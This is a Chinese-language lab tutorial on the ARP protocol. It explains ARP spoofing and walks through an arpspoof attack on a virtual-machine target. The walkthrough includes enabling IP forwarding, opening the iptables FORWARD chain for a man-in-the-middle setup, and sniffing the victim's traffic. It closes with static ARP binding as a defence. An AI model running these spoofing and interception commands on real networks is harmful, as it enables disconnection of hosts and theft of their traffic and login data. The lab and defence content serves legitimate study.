ARP协议

ARP 协议是“Address Resolution Protocol”（地址解析协议）的缩写。计算机通过 ARP 协议将 IP 地址转换成 MAC 地址。

工作原理：在以太网中，数据传输的目标地址是 MAC 地址，一个主机要和另一个主机进行直接通信，必须要知道目标主机的 MAC 地址。计算机使用者通常只知道目标机器的 IP 信息，“地址解析”就是主机在发送帧前将目标 IP 地址转换成目标 MAC 地址的过程。简单地说，ARP 协议主要负责将局域网中的 32 位 IP 地址转换为对应的 48 位物理地址，即网卡的MAC 地址，保障通信顺利进行。

PC1想要ping IP2，首先对数据包进行封装，封装到MAC地址的时候，PC1会查询自己的ARP缓存表，发现没有IP2和其MAC地址的映射，这样的话，MAC数据帧封装失败（设备通信需要对方的MAC地址，但现在没有）。故为了获取PC2的MAC地址，PC1要发送询问信息，询问PC2的MAC地址。

Question:询问信息也需要对Mac地址封装，那现在没有，应该填什么？

规定当目的MAC地址为ff-ff-ff-ff-ff-ff时，就代表这是一个询问信息。PC2收到这个询问信息后，将这里面的IP1和MAC1添加到本地的ARP缓存表中，然后PC2发送应答信息给PC1（因为缓存表里已经有PC1的IP和MAC的映射了），这个应答信息包含PC2的IP2和MAC2。PC1收到这个应答信息，就获取了PC2的MAC地址，并添加到自己的缓存表中。

注意:目的主机先完成ARP缓存，然后才是源主机完成ARP缓存。

ARP攻击原理

ARP攻击就是通过伪造IP和MAC地址之间的映射关系，使得网络无法正常通信。攻击主机向局域网内除目标主机之外的所有主机发送假的ARP应答包，其中包含目标主机的IP和假的MAC地址，使得目标主机和其他主机无法通信，实现攻击。

ARP欺骗原理

  1. 伪装成网关

    攻击者向目标主机发送ARP应答包将自己伪装成网关，从而使得原先应从目标主机流向真实网关的数据都发送到了攻击主机上。

  2. 伪装成主机

    攻击主机将自己伪装成局域网内的目标主机，将目标主机的IP地址对应的MAC地址替换为攻击主机的MAC地址，使得局域网内其他主机发送给目标主机的报文都流向了攻击主机。

注：在实施ARP欺骗时，可以实施单向或双向欺骗。其中，单向欺骗就是伪装成网关单向欺骗目标主机，使目标主机无法正常通信；双向欺骗就是伪装成局域网内的某个主机对目标主机和网关双方都实施ARP欺骗，以达到中间人攻击的目的。

使用Arpspoof工具实施ARP攻击与欺骗

Arpspoof是一款专业的ARP欺骗工具。它能够直接欺骗网关，使得通过网关访问网络的计算机全被欺骗，从而达到嗅探和捕获数据包甚至篡改数据的目的。

语法：arpspoof [选项] host

[选项]：

  • -i interface 指定要使用的接口。
  • -t target 指定一台特定主机进行ARP欺骗（如果未指定，则为局域网上的所有主机）
  • -r 双向欺骗以捕获两个方向的流量。(仅对-t有效)
  • host 指定您希望拦截数据包的host（通常是本地网关）

断网攻击中遇到的问题

当我在攻击主机上terminal中输入arpspoof -i eth0 -t 10.211.55.13 10.211.55.1开始攻击后，通过输出我观察到攻击主机在向目标主机发送欺骗的ARP应答包，我认为ARP攻击就生效了遂ctrl+c结束了发送，此时我去目标主机上检查ARP缓存表发现网关MAC地址并没有改变还是正确的，ping百度也仍能ping通，说明网络正常。通过查阅资料，发现：

网关会定时向局域网广播自身的IP地址和MAC地址，因此在进行ARP欺骗时，也要定时进行，以达到持续欺骗的目的。

也就是说，我ctrl+c之后就相当于是停止攻击了，之后网关会广播自己正确的IP地址和MAC地址，就又会恢复正常，所以想要实施ARP攻击，这是持续的。

ARP欺骗和网络嗅探获取目标主机网络数据

上述ARP断网攻击，使得在攻击时间段时，目标主机可能无法获取想要的网络资源，网络通信发生了错误，但是这从攻击者的角度来说并没有获益什么。故下面进行的是，通过ARP欺骗，目标主机仍能访问网络，使得我们可以在攻击主机上获取目标主机上的网络数据包。

主要思想：通过ARP欺骗使得用户上网时发送请求至网关（攻击主机的MAC地址），也就是说发到了攻击主机上，之后通过攻击主机转发给真实的网关，接受返回包同理，对网关进行了欺骗，原本是要发往目标主机的，但是现在会发给攻击主机，然后再由攻击主机转发给目标主机。在这之中，攻击主机作为中间人，相当于一个拦截网络流量的代理路由器。

实现上述目标最关键的一步：开启路由转发

开启路由转发

用户开启路由转发后，其原理就是用于做双端口之间的流量转发，从而使得目标主机就能访问网络了。

  1. 在攻击主机terminal中输入命令：echo 1 > /proc/sys/net/ipv4/ip_forward

    proc目录代表的是内存，即ip_forward是一个临时文件，用于给此程序读取的。设置为1代表转发，重启后会变回0。当然也可以手动输入关闭。

  2. 验证

    └─# cat /proc/sys/net/ipv4/ip_forward
1

    看到此输出则开启成功。

  3. 解决路由转发出错问题

    通过反复检查，确实路由转发功能已经开启，cat /proc/sys/net/ipv4/ip_forward命令的输出结果为1。也曾想过是否是虚拟机网络模式的问题，尝试NAT改桥接模式，发现问题还是无法解决，开启路由转发后，进行ARP攻击目标主机仍是上不了网。

    最终，在fedora23 开启 IP 转发无效，求解这篇文章中找到了答案，问题出现在了linux防火墙上，防火墙未允许数据包的转发，所以导致即时开启了路由转发功能，仍不能奏效的原因。

    iptables防火墙简介：

    iptables的结构：iptables -> Tables -> Chains -> Rules. 简单地讲，tables由chains组成，而chains又由rules组成。其中iptables具有Filter, NAT, Mangle, Raw四种内建表。

    Filter表示iptables的默认表，因此如果你没有自定义表，那么就默认使用filter表，它具有以下三种内建链：

    • INPUT链：处理来自外部的数据。
    • OUTPUT链：处理向外发送的数据。
    • FORWARD链：将数据转发到本机的其他网卡设备上。

    而这其中涉及我们的ARP攻击中路由转发一块的的则是FORWARD链了，我们要对其规则进行配置。

    解决步骤：

    • 清空规则

      在攻击主机上执行iptables -F FORWARD命令

      -F表示删除现有的iptables规则，FORWARD即Filter中FORWARD链，该命令首先清空FORWARD链中原有规则。

    • 新建追加规则

      在攻击主机上执行iptables -A FORWARD -j ACCPET命令

      -A chain：制定要追加规则的链

      -j：执行目标（jump to target），指定了当与规则(Rule)匹配时如何处理数据包

      • 可能的值是ACCEPT, DROP, QUEUE, RETURN，MASQUERADE
      • 还可以指定其他链（Chain）作为目标

      该规则则是表明允许防火墙接收数据包。

  • 通过fliter进行筛选：ip.addr == 10.211.55.13抓目标主机上的网络包

    可以观察到目标主机现在正在访问110.242.68.3，在浏览器输入该IP发现正是百度网站。

当然还可以利用其他工具，如Ettercap、Driftnet等工具嗅探，获取目标主机上的图片以及登录HTTP网站相关隐私信息等

ARP攻击的危害

  1. 造成局域网中的其他主机断网。
  2. 劫持局域网中其他主机或网关的流量，获取敏感信息等。

ARP攻击的防御

ARP攻击主要是利用ARP的缺陷进行攻击的，由于用户不能修改协议，所以防范ARP攻击与欺骗只能借助一些工具，如静态ARP，ARP防火墙等。

以下通过静态ARP实现ARP攻击的防御：

所谓静态ARP，则是进行IP-MAC地址绑定，用户通过在主机和网关上实现双向IP地址和MAC地址绑定，即可提高网络的安全性。

  1. 查看当前主机ARP缓存表，判断ARP条目是动态的还是静态的（通过Flags Mask列，C表示动态ARP条目，CM表示静态ARP条目）

    root@ubuntu1:~# arp -n
Address        HWtype  HWaddress           Flags Mask            Iface
10.211.55.2    ether   3e:06:30:10:d4:64   C                     enp0s5
10.211.55.12   ether   00:1c:42:61:22:c3   C                     enp0s5
10.211.55.1    ether   00:1c:42:00:00:18   C                     enp0s5

    由于一般攻击者会采取对网关实施ARP攻击，所以我们对网关的IP和MAC进行静态绑定。

  2. 对网关的IP和MAC进行静态绑定

    arp -s 10.211.55.1 00:1c:42:00:00:18

  3. 再次查看ARP缓存表

    root@ubuntu1:~# arp -n
Address        HWtype  HWaddress           Flags Mask            Iface
10.211.55.2    ether   3e:06:30:10:d4:64   C                     enp0s5
10.211.55.12   ether   00:1c:42:61:22:c3   C                     enp0s5
10.211.55.1    ether   00:1c:42:00:00:18   CM                    enp0s5

    从中可以发现网关的IP和MAC已经进行静态绑定。

注：手动创建的静态ARP重启之后就没有了，若要防御，需重新绑定。
